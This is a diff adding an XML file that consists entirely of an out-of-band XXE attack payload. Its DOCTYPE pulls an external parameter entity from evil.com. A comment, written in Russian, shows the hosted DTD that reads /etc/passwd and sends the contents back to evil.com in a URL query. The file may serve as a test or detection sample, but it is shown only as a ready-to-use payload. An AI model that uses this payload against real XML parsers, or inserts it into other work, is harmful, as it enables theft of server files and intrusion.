@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY% pe SYSTEM "http://evil.com/xxe_file"> %pe; %param1; ]>
+<foo>&external;</foo>
+
+<!--        Содержимое файла xxe_file:-->
+<!--<!ENTITY% payload SYSTEM "file:///etc/passwd">-->
+<!--<!ENTITY% param1 "<!ENTITY external SYSTEM 'http://evil.com/log_xxe?data=%payload;'>">-->
